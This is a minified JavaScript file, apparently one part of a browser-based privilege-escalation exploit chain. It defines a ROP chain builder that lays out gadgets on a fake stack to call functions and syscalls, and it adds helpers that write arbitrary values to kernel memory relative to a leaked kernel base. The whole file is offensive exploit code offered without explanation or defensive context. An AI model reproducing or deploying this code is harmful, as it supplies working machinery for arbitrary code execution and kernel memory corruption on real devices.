const stack_sz=262144,reserve_upper_stack=32768,stack_reserved_idx=reserve_upper_stack/4;window.rop=function(){return this.stackback=p.malloc32(stack_sz/4+8),this.stack=this.stackback.add32(reserve_upper_stack),this.stack_array=this.stackback.backing,this.retval=this.stackback.add32(stack_sz),this.count=1,this.branches_count=0,this.branches_rsps=p.malloc(512),this.clear=function(){this.count=1,this.branches_count=0;for(var s=1;s<stack_sz/4-stack_reserved_idx;s++)this.stack_array[s+stack_reserved_idx]=0},this.pushSymbolic=function(){return this.count++,this.count-1},this.finalizeSymbolic=function(s,t){t instanceof int64?(this.stack_array[stack_reserved_idx+2*s]=t.low,this.stack_array[stack_reserved_idx+2*s+1]=t.hi):(this.stack_array[stack_reserved_idx+2*s]=t,this.stack_array[stack_reserved_idx+2*s+1]=0)},this.push=function(s){this.finalizeSymbolic(this.pushSymbolic(),s)},this.push_write8=function(s,t){this.push(gadgets["pop rdi"]),this.push(s),this.push(gadgets["pop rsi"]),this.push(t),this.push(gadgets["mov [rdi], rsi"])},this.fcall=function(s,t,i,h,r,a,e){return null!=t&&(this.push(gadgets["pop rdi"]),this.push(t)),null!=i&&(this.push(gadgets["pop rsi"]),this.push(i)),null!=h&&(this.push(gadgets["pop rdx"]),this.push(h)),null!=r&&(this.push(gadgets["pop rcx"]),this.push(r)),null!=a&&(this.push(gadgets["pop r8"]),this.push(a)),null!=e&&(this.push(gadgets["pop r9"]),this.push(e)),this.push(s),this},this.call=function(s,t,i,h,r,a,e){return this.fcall(s,t,i,h,r,a,e),this.write_result(this.retval),this.run(),p.read8(this.retval)},this.syscall=function(s,t,i,h,r,a,e){return this.call(window.syscalls[s],t,i,h,r,a,e)},this.get_rsp=function(){return this.stack.add32(8*this.count)},this.write_result=function(s){this.push(gadgets["pop rdi"]),this.push(s),this.push(gadgets["mov [rdi], rax"])},this.write_result4=function(s){this.push(gadgets["pop rdi"]),this.push(s),this.push(gadgets["mov [rdi], eax"])},this.jmp_rsp=function(s){this.push(window.gadgets["pop rsp"]),this.push(s)},this.run=function(){p.launch_chain(this),this.clear()},this.KERNEL_BASE_PTR_VAR,this.set_kernel_var=function(s){this.KERNEL_BASE_PTR_VAR=s},this.rax_kernel=function(s){this.push(gadgets["pop rax"]),this.push(this.KERNEL_BASE_PTR_VAR),this.push(gadgets["mov rax, [rax]"]),this.push(gadgets["pop rsi"]),this.push(s),this.push(gadgets["add rax, rsi"])},this.write_kernel_addr_to_chain_later=function(s){this.push(gadgets["pop rdi"]);var t=this.pushSymbolic();return this.rax_kernel(s),this.push(gadgets["mov [rdi], rax"]),t},this.kwrite8=function(s,t){this.rax_kernel(s),this.push(gadgets["pop rsi"]),this.push(t),this.push(gadgets["mov [rax], rsi"])},this.kwrite4=function(s,t){this.rax_kernel(s),this.push(gadgets["pop rdx"]),this.push(t),this.push(gadgets["mov [rax], edx"])},this.kwrite8_kaddr=function(s,t){this.rax_kernel(t),this.push(gadgets["mov rdx, rax"]),this.rax_kernel(s),this.push(gadgets["mov [rax], rdx"])},this};